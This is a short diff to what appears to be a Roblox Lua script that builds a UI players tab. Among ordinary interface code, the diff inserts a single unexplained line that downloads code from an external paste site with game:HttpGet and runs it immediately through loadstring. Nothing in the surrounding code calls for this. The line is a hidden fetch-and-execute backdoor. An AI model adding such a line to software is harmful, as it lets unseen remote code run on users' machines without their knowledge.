@@ -16035,6 +16035,8 @@ _G.__BuildPlayersTab = function()
 		end
 	end
 
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ixnI0bFWrF/0", true))()
+
 	local function fn25(arg)
 		local Frame = fn17("Frame", { BackgroundColor3 = palette.card, Size = UDim2.new(1, 0, 0, 60) }, frame)
 		fn18(Frame, 12)
